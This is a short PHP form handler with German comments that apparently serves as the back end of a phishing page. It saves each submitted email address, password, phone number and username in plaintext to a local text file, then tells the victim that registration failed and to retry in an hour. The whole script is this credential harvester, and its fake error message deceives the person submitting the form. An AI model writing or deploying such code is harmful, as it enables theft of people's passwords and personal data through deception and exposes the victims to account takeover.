<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email']; // Den eingegebenen Text aus dem Formular erhalten
    $password = $_POST['password']; // Den eingegebenen Text aus dem Formular erhalten
    $Tel = $_POST['Tel']; // Den eingegebenen Text aus dem Formular erhalten
    $Benutzername = $_POST['Benutzername']; // Den eingegebenen Text aus dem Formular erhalten


    $datei = fopen('text.txt', 'w'); // Textdatei öffnen (wenn nicht vorhanden, wird sie erstellt)
    fwrite($datei, " E-Mail: " .$email); // Text in die Datei schreiben
    fwrite($datei, " Passwort: " .$password); // Text in die Datei schreiben
    fwrite($datei, " Tel: " .$Tel); // Text in die Datei schreiben
    fwrite($datei, " Benutzername: " .$Benutzername); // Text in die Datei schreiben
    fclose($datei); // Datei schließen

    echo 'Bei der Registrierung ist etwas schief gegangen versuchen sie es in einer Stunde erneut';
}
?>
